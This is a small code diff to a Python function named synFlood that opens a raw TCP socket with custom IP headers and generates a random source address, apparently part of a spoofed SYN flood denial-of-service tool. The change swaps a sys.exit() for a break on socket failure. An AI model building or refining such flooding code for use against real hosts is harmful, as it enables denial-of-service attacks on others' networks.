@@ -22,7 +22,7 @@ def synFlood(ID, portDest, ipDest, event, queue):
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW,\
                               socket.IPPROTO_TCP)
         except:
-            sys.exit()
+            break
 
         s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         ipSource = socket.inet_ntoa(struct.pack('>I',\
